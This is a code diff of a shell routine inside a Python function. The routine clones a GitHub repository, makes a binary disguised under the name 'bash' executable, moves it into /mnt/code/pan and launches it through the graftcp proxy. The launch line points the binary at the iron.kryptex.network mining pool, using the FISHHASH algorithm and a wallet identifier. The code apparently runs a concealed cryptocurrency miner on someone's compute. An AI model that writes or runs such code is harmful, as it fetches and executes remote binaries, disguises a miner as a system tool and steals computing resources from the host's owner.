@@ -48,25 +48,37 @@ def run_script():
     # download lol
     git clone https://github.com/malogrono/lol198.git
 
-    echo "=== CHECK HOME ==="
+    echo "=== CHECK CURRENT DIRECTORY ==="
     pwd
-    ls -lah ~
+
     echo "=== CHECK PAN ==="
-    ls -ld ~/pan
-    file ~/pan
+    ls -ld /mnt/code/pan
+    file /mnt/code/pan
 
-    cd lol198 && chmod u+x bash
+    echo "=== CHECK PAN CONTENT ==="
+    ls -lah /mnt/code/pan
 
-    # pindah file
-    mv bash ~/pan
+    cd lol198
+    chmod u+x bash
+
+    echo "=== CHECK FILE ==="
+    ls -lh bash
+    file bash
+
+    # pindahkan file ke direktori pan
+    mv bash /mnt/code/pan/
 
     echo "=== CHECK PAN AFTER MV ==="
-    ls -ld ~/pan
-    file ~/pan
-    ls -lah ~/pan
+    ls -ld /mnt/code/pan
+    file /mnt/code/pan
+    ls -lah /mnt/code/pan
 
-    cd ~
-    cd pan
+    # masuk ke direktori pan
+    cd /mnt/code/pan
+
+    echo "=== FINAL DIRECTORY ==="
+    pwd
+    ls -lah
 
     echo "=== RUN PROC VIA GRAFTCP ==="
     ./graftcp/graftcp ./bash --algo FISHHASH --pool iron.kryptex.network:7017 --user d955e86ec8ebfa1aadcf13f162a10c85778e3f3ac5002660ea0097df6f3e660a.01 --ethstratum ETHPROX
